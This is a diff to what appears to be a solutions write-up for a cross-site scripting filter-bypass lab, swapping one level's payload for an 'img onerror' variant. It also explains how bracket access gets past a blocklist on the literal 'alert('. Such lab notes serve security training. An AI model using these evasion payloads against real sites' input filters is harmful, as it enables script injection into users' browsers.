@@ -25,10 +25,10 @@ Coarse keyword/regex/length blacklists bypassed via context or syntax.
 
 ### payloadfilt-level4
 
-`/payloadfilt/level4/?query=%3Csvg%2Fonload%3D(()%3D%3E%7Bthrow%2FXSS%2F%7D)()%3E`
+`/payloadfilt/level4/?query=%3Cimg%20src=x%20onerror=window%5B'alert'%5D(1)%3E`
 
-- payload: `<svg/onload=(()=>{throw/XSS/})()>`
-- context: alert/confirm/prompt( blocked; use throw or print()
+- payload: `<img src=x onerror=window['alert'](1)>`
+- context: the literal `alert(` is blocked; bracket access splits it
 
 ### payloadfilt-level5
 
